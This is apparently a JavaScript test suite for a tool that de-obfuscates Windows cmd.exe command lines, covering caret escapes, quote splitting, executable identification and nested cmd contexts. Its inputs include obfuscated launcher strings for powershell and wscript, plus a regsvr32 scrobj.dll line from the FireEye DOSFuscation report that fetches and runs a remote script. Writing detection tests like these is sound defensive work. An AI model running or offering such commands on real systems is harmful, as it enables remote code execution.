const assert           = require("chai").assert,
      tokenise         = require("../../lib/tokeniser"),
      interpret        = require("../../lib/interpreter").interpreter,
      identify_command = require("../../lib/interpreter").try_identify_command,
      split_cmd        = require("../../lib/interpreter").get_cached_cmd_blocks;

const util = {
    filterEOF: (tokens) => tokens.filter(t => t.name !== "EOF"),
    lexemes:   (tokens) => util.filterEOF(tokens).map(t => t.text),
    names:     (tokens) => util.filterEOF(tokens).map(t => t.name)
};

describe("Interpreter", () => {

    describe("Variable Expansion", () => {

        it("should return an expanded command as a 1-element array", () => {

            const input  = `echo %comspec%`,
                  output = [
                      {
                          command: {
                              name: "echo",
                              line: "C:\\Windows\\System32\\cmd.exe"
                          },
                          options: {},
                          variables: {}
                      }
                  ];
            assert.deepEqual(interpret(input), output);
        });
    });

    describe("De-obfuscation", () => {

        describe("Split in to command blocks", () => {

            it("should create a single block when no other commands exist", () => {
                const input  = `calc`,
                      output = [
                          [{ name: "LITERAL", text: "calc" }]
                      ];

                assert.deepEqual(split_cmd(tokenise(input)), output);
            });

            it("should split a command in to blocks", () => {

                const input  = `calc && (powershell) || wscript & notepad`,
                      output = [
                          ["calc", " "],
                          [" ", "(", "powershell", ")", " "],
                          [" ", "wscript", " "],
                          [" ", "notepad"]
                      ];

                let result = split_cmd(tokenise(input));
                assert.deepEqual(split_cmd(tokenise(input)).map(res => res.map(r => r.text)), output);
            });
        });

        describe("Escapes", () => {

            it("should return the input without escapes", () => {
                const input  = `^p^o^w^e^r^s^h^e^l^l`,
                      output = [{
                          command: { name: "powershell", line: "" },
                          options: {},
                          variables: {}
                      }];
                assert.deepEqual(interpret(input), output);
            });

            it("should disable escapes when 'strip_escapes' is false", () => {
                const input  = `^p^o^w^e^r^s^h^e^l^l`,
                      output = [{ command: { name: input, line: "" }, options: {}, variables: {}}];
                assert.deepEqual(interpret(input, { strip_escapes: false }), output);
            });
        });

        describe("Strings", () => {

            xit("should concatenate runs of regular strings and literals without delims", () => {
                const input  = `"abc"def"ghi"`,
                      output = [`"abcdefghi"`];
                assert.deepEqual(interpret(input), output);
            });

            it("should strip empty strings", () => {
                const input  = `w""scr""ipt""`,
                      output = [{ command: { name: "wscript", line: ""}, options: {}, variables: {}}];
                assert.deepEqual(interpret(input), output);
            });

            xit("should unify strings or literals not separated by a delimiter", () => {

                const tests = [
                    {
                        input:  `w"s"cri"pt"`,
                        output: [`"wscript"`]
                    },
                    {
                        input:  `""cscr"ipt"`,
                        output: [`"cscript"`]
                    },
                    {
                        input:  `"a"b`,
                        output: [`"ab"`]
                    },
                    {
                        input: `ab"c"`,
                        output: [`abc`]
                    },
                    {
                        input: `abc /x:"f"oo`,
                        output: [`abc /x:"foo"`]
                    }
                ];

                tests.forEach(t => assert.deepEqual(interpret(t.input), t.output));
            });
        });
    });

    describe("Identifiying commands", () => {

        it("should correctly identify commands", () => {

            const tests = [
                {
                    input: `"C:\\Windows\\System32\\cmd.exe"`,
                    output: "cmd",
                    msg: "Read a quoted path without spaces, return exe."
                },
                {
                    input: `C:\\Windows\\System32\\cmd.exe`,
                    output: "cmd",
                    msg: "Read an unquoted path and return the exe."
                },
                {
                    input: `"C:\\Users\\Joe Bloggs\\Desktop\\calc.exe"`,
                    output: `calc`,
                    msg: "Read a quoted path containing a space and return the exe."
                },
                {
                    input: `..\\..\\Windows\\regsvr32.exe`,
                    output: `regsvr32`,
                    msg: "Read a relative path and return the exe."
                },
                {
                    input: `/foo/bar.exe`,
                    output: `bar`,
                    msg: "Read a relative path and return the exe."
                },
                {
                    input: `foo/bar.exe`,
                    output: `bar`,
                    msg: "Read a relative path and return the exe."
                },
                {
                    input: `calc.exe`,
                    output: `calc`,
                    msg: "Figure out that it's an exe and return the name."
                },
                {
                    input: `regsvr32.exe /s /n foo "bar"`,
                    output: `regsvr32`
                },
                {
                    input: ` regsvr32 a b c`,
                    output: `regsvr32`,
                    msg:    "Strip leading delimiters from cmdstr"
                },
                {
                    input: `((calc.exe))`,
                    output: `calc`,
                    msg:    "Strip parens, identify the exe."
                },
                {
                    input: `"set x=y"`,
                    output: "set",
                    msg:    "Identify 'set' between quotes."
                }
            ];

            tests.forEach(
                t => assert.deepEqual(identify_command(tokenise(t.input)).command, t.output, t.msg)
            );
        });

        it("should trim any trailing delimiters immediately after the identified cmd", () => {

            const tests = [
                {
                    input:  `regsvr32 foo bar`,
                    output: ["LITERAL", "DELIMITER", "LITERAL"]
                },
                {
                    input:  `regsvr32     foo bar`,
                    output: ["LITERAL", "DELIMITER", "LITERAL"]
                },
                {
                    input:  `regsvr32,,, ;;;     foo bar`,
                    output: ["LITERAL", "DELIMITER", "LITERAL"]
                },
                {
                    input:  `regsvr32,foo bar`,
                    output: ["LITERAL", "DELIMITER", "LITERAL"]
                },
                {
                    input:  `regsvr32;foo bar`,
                    output: ["LITERAL", "DELIMITER", "LITERAL"]
                },
                {
                    input: `regsvr32`,
                    output: []
                }
            ];

            tests.forEach(t => {
                let ident = identify_command(tokenise(t.input)).rest.map(x => x.name);
                assert.deepEqual(ident, t.output);
            });
        });
    });

    describe("Running commands", () => {

        describe("Context building", () => {

            it("should create nested contexts when using nested cmd.exe instances", () => {

                const input   = `cmd /c "ca""lc"`,
                      output  = [
                          {
                              command: { name: `cmd`, line: `/c "calc"` },
                              variables: {},
                              options: { run_then_terminate: true }
                          },
                          {
                              command: { name: "calc", line: "" },
                              variables: {},
                              options: {}
                          }
                      ];

                let context = interpret(input);
                assert.deepEqual(context, output);
            });

            it("should introduce envvars with SET when SET is a sub-command", () => {

                const input  = `cmd /c "set x=y"`,
                      output = [
                          {
                              command: { name: `cmd`, line: `/c "set x=y"` },
                              variables: { },
                              options: { run_then_terminate: true }
                          },
                          {
                              command: { name: `set`, line: "x=y" },
                              variables: { x: "y" },
                              options: {}
                          }
                      ];

                let context = interpret(input);
                assert.deepEqual(context, output);
            });
        });

        describe("From FireEye DOSFuscation Report", () => {

            it("should clean-up regsvr32 output", () => {
                const input  = `regsvr32.exe /s /n /u /i:"h"t"t"p://github.com/a.jpg scrobj.dll`,
                      output = [
                          {
                              command: {
                                  name: "regsvr32",
                                  line: `/s /n /u /i:"http://github.com/a.jpg" scrobj.dll`
                              },
                              options: {},
                              variables: {}
                          }
                      ];
                assert.deepEqual(interpret(input), output);
            });
        });
    });
});
